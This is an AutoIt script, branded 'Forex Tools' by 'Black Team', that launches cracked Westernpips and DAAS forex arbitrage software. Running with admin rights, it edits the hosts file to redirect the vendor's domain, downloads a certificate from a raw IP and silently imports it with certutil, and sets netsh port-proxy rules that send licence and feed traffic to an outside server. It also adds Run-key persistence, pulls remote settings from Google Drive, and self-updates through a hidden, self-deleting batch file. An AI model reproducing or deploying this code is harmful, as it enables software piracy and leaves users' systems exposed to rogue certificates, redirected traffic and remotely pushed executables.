#Region ;**** Directives created by AutoIt3Wrapper_GUI ****
#AutoIt3Wrapper_Icon=robot-money-forex.ico
#AutoIt3Wrapper_Compression=4
#AutoIt3Wrapper_UseUpx=y
#AutoIt3Wrapper_Res_Fileversion=3.0.0.78
#AutoIt3Wrapper_Res_Fileversion_AutoIncrement=y
#AutoIt3Wrapper_Res_ProductName=Forex Tools
#AutoIt3Wrapper_Res_ProductVersion=3.0
#AutoIt3Wrapper_Res_CompanyName=Black Team
#AutoIt3Wrapper_Res_LegalCopyright=Black Team
#AutoIt3Wrapper_Res_Language=1033
#AutoIt3Wrapper_Res_requestedExecutionLevel=requireAdministrator
#EndRegion ;**** Directives created by AutoIt3Wrapper_GUI ****

#include <ButtonConstants.au3>
#include <WinAPI.au3>
#include <GUIConstantsEx.au3>
#include <WindowsConstants.au3>
#include <Array.au3>
#include <File.au3>
#include <MsgBoxConstants.au3>
#include <Process.au3>
#include <InetConstants.au3>
#include <WinAPIFiles.au3>
#include <string.au3>
#RequireAdmin

#Region ### START Koda GUI section ### Form=
$Form1 = GUICreate("Auto Tool", 257, 25, -1, 0, $WS_POPUP, 0x80)
$Button1 = GUICtrlCreateButton("Run DAAS", 0, 0, 65, 25)
$Button2 = GUICtrlCreateButton("Run WP7", 64, 0, 65, 25)
$Button5 = GUICtrlCreateButton("Restart Win", 128, 0, 65, 25)
$Button6 = GUICtrlCreateButton("Exit", 192, 0, 65, 25)
WinSetOnTop("Auto Tool", "", 1)
GUISetState()
#EndRegion ### END Koda GUI section ###

_PinToMenu(@ScriptFullPath, 'Task')     ; Pin Item

Global $Destroy
Global $daasactive
Global $wp7active
Global $wp7lmax
Global $feedlmax
Global $newverion
Global $newverionWP
Global $daasupdate
Global $wp7update
Global $sPublicIP
Global $lmaxlogin
Global $updatescript = @AppDataDir & "\Microsoft\Windows\Start Menu\Programs\Startup\updatescript.cmd" ;define batch update filename cmd or bat should work
Global $autoupdate
Global $latestversion
Global $latestexe
Global $FeedServer
Global $FeedPort

Add_AutoRun()
Check_Hosts()
resetip()
read_setting()
UpdateCheck()
Kill_Bridge()
Del_Bridge()

Local $net = NetFrameworkVersion()
Local $runtimeversion = Desktop_Runtime_is_installed()

If Not StringInStr($runtimeversion, "Microsoft .NET Runtime - 7.0.2") Then
	$downlad = _webDownloader("https://download.visualstudio.microsoft.com/download/pr/f63a565f-28cc-4cb0-94f4-e78bc2412801/f4e19159c0a2980b880ee6f1a73a1199/windowsdesktop-runtime-7.0.2-win-x86.exe", "runtime.exe", "Microsoft .NET Runtime - 7.0.2", @TempDir, False)
	RunWait(@TempDir & "\runtime.exe /install /quiet /norestart")
	FileDelete($downlad)
	ProgressOff()
EndIf


If Not StringInStr($net, "4.8") Then
	$downlad = _webDownloader("https://go.microsoft.com/fwlink/?linkid=2088631", "net48.exe", "Microsoft .NET Framework 4.8", @TempDir, False)
	RunWait(@TempDir & "\net48.exe /q /norestart")
	FileDelete($downlad)
	ProgressOff()
EndIf

While 1
	$nMsg = GUIGetMsg()
	Switch $nMsg
		Case $GUI_EVENT_CLOSE
			Kill_Bridge()
			Del_Bridge()
			Exit

		Case $Button1
			If GUICtrlRead($Button1) = "Run DAAS" Then
				StartDAAS()
				If ProcessExists("DAAS.exe") Then
					GUICtrlSetData($Button1, "Close DAAS")
				EndIf
			Else
				ProcessClose("DAAS.exe")
				resetip()
				GUICtrlSetData($Button1, "Run DAAS")
			EndIf

		Case $Button2

			If GUICtrlRead($Button2) = "Run WP7" Then
				Kill_Bridge()
				Del_Bridge()
				StartWP()
				If ProcessExists("WesternpipsPrivate7.exe") Then
					GUICtrlSetData($Button2, "Close WP7")
				EndIf
			Else
				ProcessClose("TradeMonitor.exe")
				ProcessClose("FeedMonitor.exe")
				ProcessClose("WesternpipsPrivate7.exe")
				Kill_Bridge()
				Del_Bridge()
				resetip()
				GUICtrlSetData($Button2, "Run WP7")
			EndIf

		Case $Button5
			Reset()
		Case $Button6
			Exit
	EndSwitch
	Sleep(100)
WEnd

Func Kill_MT()
	While 1
		If Not ProcessExists("terminal64.exe") And Not ProcessExists("terminal.exe") Then ExitLoop
		If ProcessExists("terminal64.exe") Then ProcessClose("terminal64.exe")
		If ProcessExists("terminal.exe") Then ProcessClose("terminal.exe")
		Sleep(1000)
	WEnd
EndFunc   ;==>Kill_MT


Func StartDAAS()
	read_setting()
	check_updade_daas()
	Run_daas()
EndFunc   ;==>StartDAAS

Func StartWP()
	read_setting()
	check_update_wp7()
	Run_WP7()
EndFunc   ;==>StartWP

Func check_update_wp7()
	$oldversion = IniRead(@WindowsDir & "\BTSeting.ini", "WP7", "Version", "Default Value")
	If $wp7lmax = "True" Then
		If Not FileExists("C:\Program Files\Westernpips\Westernpips Trade Monitor 3.7 Exclusive\TradeMonitor.exe") Then
			$downlad = _webDownloader($feedlmax, "wpfeed.exe", "Westernpips Trade Monitor 3.7 Exclusive", @TempDir, False)
			ProgressOff()
			If ProcessExists("TradeMonitor.exe") Then ProcessClose("TradeMonitor.exe")
			If ProcessExists("FeedMonitor.exe") Then ProcessClose("FeedMonitor.exe")
			RunWait(@TempDir & "\wpfeed.exe")
			FileDelete($downlad)
		EndIf
		Sleep(3000)
		FileDelete("C:\Program Files\Westernpips\Westernpips Trade Monitor 3.7 Exclusive\Feeder.config")
		FileWrite("C:\Program Files\Westernpips\Westernpips Trade Monitor 3.7 Exclusive\Feeder.config", $lmaxlogin)
		Run_FeedLMAX()
	Else
		FileDelete("C:\Program Files\Westernpips\Westernpips Trade Monitor 3.7 Exclusive\Feeder.config")
	EndIf

	If Not StringInStr($newverionWP, $oldversion) Then
		$actionupdate = MsgBox(3, "WP7 Update version " & $newverionWP, "Yes: Update new version " & $newverionWP & @CRLF & "No: Keep Old version, never ask again" & @CRLF & "Cancel: Continue old version, update late")
		If $actionupdate = 6 Then
			$downlad = _webDownloader($wp7update, "wp7.exe", "WP Version " & $newverionWP, @TempDir, False)
			ProgressOff()
			If ProcessExists("WesternpipsPrivate7.exe") Then ProcessClose("WesternpipsPrivate7.exe")
			RunWait(@TempDir & "\wp7.exe")
			FileDelete($downlad)
			IniWrite(@WindowsDir & "\BTSeting.ini", "WP7", "Version", $newverionWP)
			MsgBox(0, "Success", "Update Successfull")
		ElseIf $actionupdate = 7 Then
			IniWrite(@WindowsDir & "\BTSeting.ini", "WP7", "Version", $newverionWP)
		EndIf
	ElseIf Not FileExists("C:\Program Files (x86)\Westernpips Private 7\WesternpipsPrivate7.exe") Then
		$downlad = _webDownloader($wp7update, "wp7.exe", "WP Version " & $newverionWP, @TempDir, False)
		ProgressOff()
		RunWait(@TempDir & "\wp7.exe")
		FileDelete($downlad)
		IniWrite(@WindowsDir & "\BTSeting.ini", "WP7", "Version", $newverionWP)
	EndIf
EndFunc   ;==>check_update_wp7

Func check_updade_daas()
	$oldversion = IniRead(@WindowsDir & "\BTSeting.ini", "DAAS", "Version", "Default Value")
	If Not StringInStr($newverion, $oldversion) Then
		$actionupdate = MsgBox(3, "DAAS Update Version " & $newverion, "Yes: Update new version " & $newverion & @CRLF & "No: Keep Old version, never ask again" & @CRLF & "Cancel: Continue old version, update late")
		If $actionupdate = 6 Then
			$downlad = _webDownloader($daasupdate, "daas.exe", "DAAS version " & $newverion, @TempDir, False)
			ProgressOff()
			If ProcessExists("DAAS.exe") Then ProcessClose("DAAS.exe")
			RunWait(@TempDir & "\daas.exe")
			FileDelete($downlad)
			IniWrite(@WindowsDir & "\BTSeting.ini", "DAAS", "Version", $newverion)
			MsgBox(0, "Success", "Update Successfull")
		ElseIf $actionupdate = 7 Then
			IniWrite(@WindowsDir & "\BTSeting.ini", "DAAS", "Version", $newverion)
		EndIf
	ElseIf Not FileExists(@DesktopDir & "\DAAS\DaasPreloader.exe") Then
		$downlad = _webDownloader($daasupdate, "daas.exe", "DAAS version " & $newverion, @TempDir, False)
		ProgressOff()
		If ProcessExists("DAAS.exe") Then ProcessClose("DAAS.exe")
		RunWait(@TempDir & "\daas.exe")
		FileDelete($downlad)
		IniWrite(@WindowsDir & "\BTSeting.ini", "DAAS", "Version", $newverion)
	EndIf
EndFunc   ;==>check_updade_daas

Func Run_daas()
	forwardip()
	Change_Feed_Daas()
	While 1
		If Not ProcessExists("DAAS.exe") Then Run(@DesktopDir & "\DAAS\DaasPreloader.exe Cr@ck-W3sternpips.Com 4fd478cb1324229a8accad82426385f2", @DesktopDir & "\DAAS")
		ProcessWait("DAAS.exe", 15)
		If ProcessExists("DAAS.exe") Then
			$waitdaasactive = _GetWinTitleFromProcName("DAAS.exe")
			If StringInStr($waitdaasactive, "Cr@ck-W3sternpips.Com") Then
				GUICtrlSetData($Button1, "Close DAAS")
				ExitLoop
			ElseIf ProcessExists("WerFault.exe") Then
				ProcessClose("WerFault.exe")
				ProcessClose("DAAS.exe")
				Run(@DesktopDir & "\DAAS\ms.exe")
				ProcessWait("ngen.exe")
				ProcessWaitClose("ngen.exe")
				Run(@DesktopDir & "\DAAS\sys.exe")
				ProcessWait("ngen.exe")
				ProcessWaitClose("ngen.exe")
			EndIf
		Else
			Run(@DesktopDir & "\DAAS\ms.exe")
			ProcessWait("ngen.exe")
			ProcessWaitClose("ngen.exe")
			Run(@DesktopDir & "\DAAS\sys.exe")
			ProcessWait("ngen.exe")
			ProcessWaitClose("ngen.exe")
		EndIf
		Sleep(1000)
	WEnd
	resetip()
EndFunc   ;==>Run_daas

Func Run_WP7()
	forwardip()
	While 1
		If Not ProcessExists("WesternpipsPrivate7.exe") Then Run("C:\Program Files (x86)\Westernpips Private 7\WesternpipsPrivate7.exe", "C:\Program Files (x86)\Westernpips Private 7")
		ProcessWait("WesternpipsPrivate7.exe", 5)
		If ProcessExists("WesternpipsPrivate7.exe") Then
			WinWait("Westernpips Private 7", "")
			WinActivate("Westernpips Private 7", "")
			Sleep(500)
			Send("{ENTER}")
			Sleep(5000)
			resetip()
			Pass_Feed_wp7()
			GUICtrlSetData($Button1, "Close DAAS")
			ExitLoop
		Else
			ProcessClose("WerFault.exe")
			Run(@DesktopDir & "\DAAS\ms.exe")
			ProcessWait("ngen.exe")
			ProcessWaitClose("ngen.exe")
			Run(@DesktopDir & "\DAAS\sys.exe")
			ProcessWait("ngen.exe")
			ProcessWaitClose("ngen.exe")
		EndIf
		Sleep(1000)
	WEnd
EndFunc   ;==>Run_WP7

Func Run_FeedLMAX()
	If Not ProcessExists("FeedMonitor.exe") Then
		resetip()
		If ProcessExists("TradeMonitor.exe") Then ProcessClose("TradeMonitor.exe")
		Run("C:\Program Files\Westernpips\Westernpips Trade Monitor 3.7 Exclusive\TradeMonitor.exe", "C:\Program Files\Westernpips\Westernpips Trade Monitor 3.7 Exclusive")
		WinWait("Client Login", "", 10)
		ControlClick("Client Login", "", "[NAME:button1]")
		WinWait("End user license agreement", "", 10)
		ControlClick("End user license agreement", "", "[NAME:button1]")
		WinWait("Westernpips Trade Monitor 3.7 Exclusive", "", 10)
		Sleep(3000)
		ControlClick("Westernpips Trade Monitor 3.7 Exclusive", "", "[NAME:btLmax]")
		Sleep(3000)
		ControlClick("Westernpips Trade Monitor 3.7 Exclusive", "", "[NAME:cbServerFeed]")
		Sleep(3000)
		ControlClick("Westernpips Trade Monitor 3.7 Exclusive", "", "[NAME:btStart]")
		WinWait("Lmax Monitor", "", 10)
		WinSetState("Westernpips Trade Monitor 3.7 Exclusive", "", @SW_HIDE)
	Else
		GUICtrlSetData($Button2, "Close WP7")
	EndIf
EndFunc   ;==>Run_FeedLMAX

Func Pass_Feed_wp7()
	RunWait(@ComSpec & " /C " & 'netsh int ip add address "Loopback" 185.95.16.65/32', @TempDir, @SW_HIDE)
	RunWait(@ComSpec & " /C " & 'netsh interface portproxy add v4tov4 listenaddress=185.95.16.65 listenport=8082 connectaddress=45.76.136.230 connectport=12030', @TempDir, @SW_HIDE)
EndFunc   ;==>Pass_Feed_wp7

Func _GetWinTitleFromProcName($s_ProcName)
	$pid = ProcessExists($s_ProcName)
	$a_list = WinList()
	For $i = 1 To $a_list[0][0]
		If $a_list[$i][0] <> "" Then
			$PID2 = WinGetProcess($a_list[$i][0])
			If $pid = $PID2 Then Return $a_list[$i][0]
		EndIf
	Next
EndFunc   ;==>_GetWinTitleFromProcName


Func Reset()
	Run("C:\Windows\System32\shutdown.exe -r -t 00")
EndFunc   ;==>Reset

Func forwardip()
	RunWait(@ComSpec & " /C " & 'netsh interface portproxy reset all', @TempDir, @SW_HIDE)
	RunWait(@ComSpec & " /C " & 'netsh int ip add address "Loopback" 37.59.176.46/24', @TempDir, @SW_HIDE)
	RunWait(@ComSpec & " /C " & 'netsh int ip add address "Loopback" 52.14.115.68/24', @TempDir, @SW_HIDE)
	RunWait(@ComSpec & " /C " & 'netsh int ip add address "Loopback" 3.22.64.61/24', @TempDir, @SW_HIDE)
	RunWait(@ComSpec & " /C " & 'netsh int ip add address "Loopback" 107.161.75.156/32', @TempDir, @SW_HIDE)
	RunWait(@ComSpec & " /C " & 'netsh interface portproxy add v4tov4 listenaddress=0.0.0.0 listenport=6901 connectaddress=45.76.136.230 connectport=6901', @TempDir, @SW_HIDE)
	RunWait(@ComSpec & " /C " & 'netsh interface portproxy add v4tov4 listenaddress=0.0.0.0 listenport=6902 connectaddress=45.76.136.230 connectport=6902', @TempDir, @SW_HIDE)
	RunWait(@ComSpec & " /C " & 'netsh interface portproxy add v4tov4 listenaddress=0.0.0.0 listenport=3024 connectaddress=45.76.136.230 connectport=3024', @TempDir, @SW_HIDE)
	RunWait(@ComSpec & " /C " & 'netsh interface portproxy add v4tov4 listenaddress=0.0.0.0 listenport=' & $daasactive & ' connectaddress=45.76.136.230 connectport=' & $daasactive, @TempDir, @SW_HIDE)
	RunWait(@ComSpec & " /C " & 'netsh interface portproxy add v4tov4 listenaddress=37.59.176.46 listenport=' & $wp7active & ' connectaddress=45.76.136.230 connectport=' & $wp7active, @TempDir, @SW_HIDE)
EndFunc   ;==>forwardip

Func resetip()
	RunWait(@ComSpec & " /C " & 'netsh interface portproxy reset all', @TempDir, @SW_HIDE)
	RunWait(@ComSpec & " /C " & 'netsh int ip delete address "Loopback" 37.59.176.46', @TempDir, @SW_HIDE)
	RunWait(@ComSpec & " /C " & 'netsh int ip delete address "Loopback" 3.22.64.61', @TempDir, @SW_HIDE)
	RunWait(@ComSpec & " /C " & 'netsh int ip delete address "Loopback" 185.95.16.65', @TempDir, @SW_HIDE)
	RunWait(@ComSpec & " /C " & 'netsh int ip delete address "Loopback" 52.14.115.68', @TempDir, @SW_HIDE)
	RunWait(@ComSpec & " /C " & 'netsh int ip delete address "Loopback" 107.161.75.156', @TempDir, @SW_HIDE)
EndFunc   ;==>resetip

Func Check_Hosts()
	$strHost = @WindowsDir & "\System32\drivers\etc\hosts"
	$hFile = FileRead($strHost)     ; The 1 parameter just appends to the end of the file
	FileClose($hFile)
	If Not StringInStr($hFile, "bjfsoft.xyz") Then
		FileWrite($strHost, @CR & "37.59.176.46 bjfsoft.xyz")
		InetGet("http://104.207.129.229/new-bjfsoft-pass-YourPassword.pfx", @DesktopDir & "\new-bjfsoft-pass-YourPassword.pfx")
		Sleep(500)
		RunWait("certutil -f -user -p YourPassword -importpfx %USERPROFILE%\Desktop\new-bjfsoft-pass-YourPassword.pfx NoRoot")
		FileDelete(@DesktopDir & "\new-bjfsoft-pass-YourPassword.pfx")
	EndIf
EndFunc   ;==>Check_Hosts

Func NetFrameworkVersion()
	Local $sKey, $sBaseKeyName, $sBVersion, $sBBVersion, $versions = '', $z = 0, $i = 0
	$sKey = "HKLM\SOFTWARE\Microsoft\NET Framework Setup\NDP"
	Do
		$z += 1
		$sBaseKeyName = RegEnumKey($sKey, $z)
		If @error Then ExitLoop
		If StringLeft($sBaseKeyName, 1) = "v" Then
			;1st check
			$sBVersion = RegRead($sKey & "\" & $sBaseKeyName, "Version")
			If Not @error Then
				$versions &= $sBVersion & @CRLF
			Else
				$i = 0
				Do
					$i += 1
					$sKeyName = RegEnumKey($sKey & "\" & $sBaseKeyName, $i)
					If @error Then ExitLoop
					$sBBVersion = RegRead($sKey & "\" & $sBaseKeyName & "\" & $sKeyName, "Version")
				Until $sKeyName = '' Or $sBBVersion <> ''
				If $sBBVersion <> '' Then $versions &= $sBBVersion & @LF
			EndIf
		EndIf
	Until $sBaseKeyName = ''
	Return $versions
EndFunc   ;==>NetFrameworkVersion


Func Desktop_Runtime_is_installed()
	Local $sKey, $sBaseKeyName, $sVersion, $versions = '', $z = 0
	If @OSArch = "X64" Then
		$sKey = "HKLM\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall"
	Else
		$sKey = "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall"
	EndIf

	Do
		$z += 1
		$sBaseKeyName = RegEnumKey($sKey, $z)

		If @error Then ExitLoop

		$sVersion = RegRead($sKey & "\" & $sBaseKeyName, "DisplayName")

		If StringInStr($sVersion, "Microsoft .NET Runtime") Then
			$versions &= $sVersion & @CRLF
		EndIf

	Until $sBaseKeyName = ''

	Return $versions
EndFunc   ;==>Desktop_Runtime_is_installed

Func read_setting()
	$ini = InetGet("https://drive.google.com/uc?id=1UU90DPfZp5coPYMfjd8zyoBtn0ZXsMfm&export=download", @WindowsDir & "\blackteam.ini")
	InetClose($ini)
	If @error Then Exit
	$Destroy = IniRead(@WindowsDir & "\Blackteam.ini", "Destroy", "Destroy", "Default Value")
	$daasactive = IniRead(@WindowsDir & "\Blackteam.ini", "DAAS", "ActivePort", "Default Value")
	$newverion = IniRead(@WindowsDir & "\Blackteam.ini", "DAAS", "Version", "Default Value")
	$daasupdate = IniRead(@WindowsDir & "\Blackteam.ini", "DAAS", "Update", "Default Value")
	$FeedServer = IniRead(@WindowsDir & "\Blackteam.ini", "DAAS", "FeedServer", "Default Value")
	$FeedPort = IniRead(@WindowsDir & "\Blackteam.ini", "DAAS", "FeedPort", "Default Value")
	$wp7active = IniRead(@WindowsDir & "\Blackteam.ini", "WP7", "ActivePort", "Default Value")
	$wp7lmax = IniRead(@WindowsDir & "\Blackteam.ini", "WP7", "LMAX", "Default Value")
	$feedlmax = IniRead(@WindowsDir & "\Blackteam.ini", "WP7", "FeedMonitor", "Default Value")
	$newverionWP = IniRead(@WindowsDir & "\Blackteam.ini", "WP7", "Version", "Default Value")
	$wp7update = IniRead(@WindowsDir & "\Blackteam.ini", "WP7", "Update", "Default Value")
	$lmaxlogin = IniRead(@WindowsDir & "\Blackteam.ini", "WP7", "LMAXLOGIN", "Default Value")
	$latestversion = IniRead(@WindowsDir & "\Blackteam.ini", "File", "Latestversion", "Default Value")
	$autoupdate = IniRead(@WindowsDir & "\Blackteam.ini", "File", "Autoupdate", "Default Value")
	$latestexe = IniRead(@WindowsDir & "\Blackteam.ini", "File", "Latestexe", "Default Value")
	FileDelete($ini)
EndFunc   ;==>read_setting

Func _webDownloader($sSourceURL, $sTargetName, $sVisibleName, $sTargetDir = @TempDir, $bProgressOff = True, $iEndMsgTime = 2000, $sDownloaderTitle = "Downloader")
	Local $iMBbytes = 1048576
	If Not FileExists($sTargetDir) Then DirCreate($sTargetDir)
	Local $sTargetPath = $sTargetDir & "\" & $sTargetName
	Local $iFileSize = InetGetSize($sSourceURL)
	Local $hFileDownload = InetGet($sSourceURL, $sTargetPath, $INET_LOCALCACHE, $INET_DOWNLOADBACKGROUND)
	ProgressOn($sDownloaderTitle, "Downloading " & $sVisibleName)
	Do
		Sleep(250)
		Local $iDLPercentage = Round(InetGetInfo($hFileDownload, $INET_DOWNLOADREAD) * 100 / $iFileSize, 0)
		Local $iDLBytes = Round(InetGetInfo($hFileDownload, $INET_DOWNLOADREAD) / $iMBbytes, 2)
		Local $iDLTotalBytes = Round($iFileSize / $iMBbytes, 2)
		If IsNumber($iDLBytes) And $iDLBytes >= 0 Then
			ProgressSet($iDLPercentage, $iDLPercentage & "% - Downloaded " & $iDLBytes & " MB of " & $iDLTotalBytes & " MB")
		Else
			ProgressSet(0, "Downloading '" & $sVisibleName & "'")
		EndIf
	Until InetGetInfo($hFileDownload, $INET_DOWNLOADCOMPLETE)
	If InetGetInfo($hFileDownload, $INET_DOWNLOADSUCCESS) Then
		ProgressSet(100, "Downloading '" & $sVisibleName & "' completed")
		If $bProgressOff Then
			Sleep($iEndMsgTime)
			ProgressOff()
		EndIf
		Return $sTargetPath
	Else
		Local $errorCode = InetGetInfo($hFileDownload, $INET_DOWNLOADERROR)
		ProgressSet(0, "Downloading '" & $sVisibleName & "' failed." & @CRLF & "Error code: " & $errorCode)
		If $bProgressOff Then
			Sleep($iEndMsgTime)
			ProgressOff()
		EndIf
		SetError(1, $errorCode, False)
	EndIf
EndFunc   ;==>_webDownloader

Func UpdateCheck()
	$currentversion = FileGetVersion(@AutoItExe) ;check exe version
	If $currentversion = $latestversion Then
		If $autoupdate <> "True" Then
			MsgBox(64, "Update Check", "You are running the latest version: " & $currentversion)
			Return
		Else
			$autoupdate = "False" ;if autoupdate is true we want to suppress version confirmation
			Return
		EndIf
	ElseIf $latestversion <> "" Then ;you could change this to only update for greater versions, shouldn't matter if you maintin the version info properly
		Update()
	Else ;version file was either unavailable or blank
		If $autoupdate <> "True" Then
			MsgBox(64, "Update Check", "Could not contact update server")
			Return
		Else
			$autoupdate = "False" ;if autoupdate is true we want to suppress the error
			Return
		EndIf
	EndIf
EndFunc   ;==>UpdateCheck

Func Update()
	$updatedl = InetGet($latestexe, @ScriptDir & "\latest.exe", 1, 1)  ;download update
	$updatesize = InetGetSize($latestexe)  ;get total size for progress bar
	ProgressOn("Update", "Downloading...", "0%")
	While Not InetGetInfo($updatedl, 2) ;loop and update progress bar until download is complete
		Sleep(100)
		$updaterec = InetGetInfo($updatedl, 0)
		$upct = Int($updaterec / $updatesize * 100)
		ProgressSet($upct, $upct & "%")
	WEnd
	ProgressOff()
	If InetGetInfo($updatedl, 4) <> 0 Then  ;check for download error
		If $autoupdate <> "True" Then
			MsgBox(64, "Update Check", "Unable to download or write file")
		Else
			$autoupdate = "False" ;again no error message if autoupdate is true
		EndIf
	Else ;success, write batch script
		$exename = @ScriptName
		$pid = @AutoItPID
		FileWriteLine($updatescript, "@echo off")
		FileWriteLine($updatescript, ":loop")
		FileWriteLine($updatescript, "tasklist /fi " & '"pid eq ' & $pid & '" | find ":" > nul')  ;batch file won't continue until old autoit exe process id terminates
		FileWriteLine($updatescript, "if errorlevel 1 (")
		FileWriteLine($updatescript, "  ping 127.0.0.1 -n 2")
		FileWriteLine($updatescript, "  goto loop")
		FileWriteLine($updatescript, ") else (")
		FileWriteLine($updatescript, "  goto continue")
		FileWriteLine($updatescript, ")")
		FileWriteLine($updatescript, ":continue")
		FileWriteLine($updatescript, "del " & '"' & @ScriptDir & "\" & $exename & '"')  ;deletes old exe
		FileWriteLine($updatescript, "del " & '"' & $exename & '"')   ;deletes old exe
		FileWriteLine($updatescript, "ren latest.exe " & '"' & $exename & '"')  ;renames new exe to the same name
		FileWriteLine($updatescript, 'start "" ' & '"' & $exename & '"' & " " & $CmdLineRaw)  ;launches with any parameters the old exe had
		FileWriteLine($updatescript, "start /b """" cmd /c del ""%~f0""&exit /b")  ;batch file self deletes
		Run($updatescript, @ScriptDir, @SW_HIDE)  ;launch batch file in hidden mode
		Exit ;exit so batch file can continue
	EndIf
EndFunc   ;==>Update

Func Add_AutoRun()
	RunWait(@ComSpec & " /C " & 'Reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "BTool" /t REG_SZ /d "' & @ScriptFullPath & ' " /f ', @TempDir, @SW_HIDE)
EndFunc   ;==>Add_AutoRun

Func _PinToMenu($file, $loc = 'task', $pin = True)
	If @OSBuild < 7600 Then Return SetError(1) ; Windows 7 only
	If Not FileExists($file) Then Return SetError(2)
	Local $sFolder = StringRegExpReplace($file, "(^.*\\)(.*)", "$1")
	Local $sFile = StringRegExpReplace($file, "^.*\\", '')
	$ObjShell = ObjCreate("Shell.Application")
	$objFolder = $ObjShell.Namespace($sFolder)
	$objFolderItem = $objFolder.ParseName($sFile)
	For $Val In $objFolderItem.Verbs()
		If $pin Then
			If $loc = 'task' And $val() = "Pin to Tas&kBar" Then
				$Val.DoIt()
				Return
			ElseIf $loc = 'start' And $val() = "Pin to Start Men&u" Then
				$Val.DoIt()
				Return
			EndIf
		Else
			If $loc = 'task' And $val() = "Unpin from Tas&kBar" Then
				$Val.DoIt()
				Return
			ElseIf $loc = 'start' And $val() = "Unpin from Start Men&u" Then
				$Val.DoIt()
				Return
			EndIf
		EndIf
	Next
EndFunc   ;==>_PinToMenu

Func Change_Feed_Daas()
	RunWait(@ComSpec & " /C " & 'Reg add "HKEY_CURRENT_USER\Software\DAAS_Cr@ck-W3sternpips.Com\Sessions\BJF Feed (London)\Quotes" /v "FeederAdress" /t REG_SZ /d "' & $FeedServer & '" /f', @TempDir, @SW_HIDE)
	RunWait(@ComSpec & " /C " & 'REG ADD "HKEY_CURRENT_USER\Software\DAAS_Cr@ck-W3sternpips.Com\Sessions\BJF Feed (London)\Quotes" /v "FeederPort" /t REG_DWORD /d "' & $FeedPort & '" /f', @TempDir, @SW_HIDE)
EndFunc   ;==>Change_Feed_Daas

Func Kill_Bridge()
	Local $processList = ProcessList()
	If IsArray($processList) Then
		For $i = 1 To $processList[0][0]
			If StringInStr($processList[$i][0], "Bridge_") Then ProcessClose($processList[$i][0])
		Next
	EndIf
EndFunc   ;==>Kill_Bridge

Func Del_Bridge()
	Local $directory = @AppDataDir
	Local $file_list = _FileListToArray($directory, Default, Default, True)
	For $i = 1 To $file_list[0]
		If StringInStr($file_list[$i], "Bridge_") Then FileDelete($file_list[$i])
	Next
EndFunc   ;==>Del_Bridge
